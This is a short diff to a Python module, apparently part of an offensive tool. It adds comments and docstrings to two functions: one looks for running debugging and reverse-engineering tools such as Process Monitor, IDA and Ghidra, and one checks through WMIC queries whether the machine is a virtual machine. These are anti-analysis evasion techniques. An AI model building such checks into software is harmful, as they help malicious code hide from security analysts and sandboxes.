@@ -2,8 +2,10 @@ import time
 import sys
 import psutil
 from Utils.helpers import run_pwsh
+# //TODO: add doc for this whole thing
 
 def evade_debug():
+    """Kind'a stupid. i should intercept things by winapi probably"""
     debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
     for process in psutil.process_iter():
         for i in debug_process:
@@ -12,6 +14,9 @@ def evade_debug():
 
 
 def detect_vm():
+    """Stupid but working.
+    //TODO: we have lot's of things to check before running this tests.
+    this test is noisy and we should avoid it as much as we can."""
     commands = {'WMIC BIOS GET SERIALNUMBER': [],
                 'WMIC COMPUTERSYSTEM GET MODEL': ['HVM domU', 'Virtual Machine', 'VirtualBox', 'KVM',
                                                   'VMware Virtual Platform'],
